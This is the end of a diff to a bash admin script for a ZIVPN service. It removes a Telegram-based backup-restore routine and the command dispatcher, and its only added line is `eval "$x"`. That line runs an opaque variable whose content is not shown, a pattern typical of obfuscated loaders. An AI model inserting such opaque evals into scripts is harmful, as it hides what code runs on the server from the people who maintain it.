-    if [ -z "$file_id" ]; then
-        echo "File ID cannot be empty. Aborting."
-        exit 1
-    fi
-
-    read -p "WARNING: This will overwrite current user data. Are you sure? (y/n): " confirm
-    if [ "$confirm" != "y" ]; then
-        echo "Restore cancelled."
-        exit 0
-    fi
-
-    echo "Fetching file information from Telegram..."
-    local response
-    response=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${file_id}")
-    
-    local file_path
-    file_path=$(echo "$response" | jq -r '.result.file_path')
-
-    if [ -z "$file_path" ] || [ "$file_path" == "null" ]; then
-        echo "Failed to get file path from Telegram. Is the File ID correct?"
-        echo "Telegram API response: $response"
-        exit 1
-    fi
-
-    local download_url="https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${file_path}"
-    local temp_restore_path="/tmp/restore_$(basename "$file_path")"
-
-    echo "Downloading backup file..."
-    curl -s -o "$temp_restore_path" "$download_url"
-    if [ $? -ne 0 ]; then
-        echo "Failed to download backup file. Aborting."
-        rm -f "$temp_restore_path"
-        exit 1
-    fi
-
-    echo "Extracting and restoring data..."
-    unzip -o "$temp_restore_path" -d "$CONFIG_DIR"
-    if [ $? -ne 0 ]; then
-        echo "Failed to extract backup archive. Aborting."
-        rm -f "$temp_restore_path"
-        exit 1
-    fi
-
-    rm -f "$temp_restore_path"
-    
-    echo "Restarting ZIVPN service to apply changes..."
-    systemctl restart zivpn.service
-
-    echo "Restore complete! User data has been restored from backup."
-}
-
-# --- Main Script Logic ---
-case "$1" in
-    backup)
-        handle_backup
-        ;;
-    restore)
-        handle_restore
-        ;;
-    setup-telegram)
-        setup_telegram
-        ;;
-    expiry-notification)
-        if [ $# -ne 6 ]; then
-            echo "Usage: $0 expiry-notification <host> <ip> <client> <isp> <exp_date>"
-            exit 1
-        fi
-        handle_expiry_notification "$2" "$3" "$4" "$5" "$6"
-        ;;
-    renewed-notification)
-        if [ $# -ne 6 ]; then
-            echo "Usage: $0 renewed-notification <host> <ip> <client> <isp> <expiry_timestamp>"
-            exit 1
-        fi
-        handle_renewed_notification "$2" "$3" "$4" "$5" "$6"
-        ;;
-    api-key-notification)
-        if [ $# -ne 4 ]; then
-            echo "Usage: $0 api-key-notification <api_key> <server_ip> <domain>"
-            exit 1
-        fi
-        handle_api_key_notification "$2" "$3" "$4"
-        ;;
-    *)
-        echo "Usage: $0 {backup|restore|setup-telegram|expiry-notification|renewed-notification|api-key-notification}"
-        exit 1
-        ;;
-esac
+eval "$x"
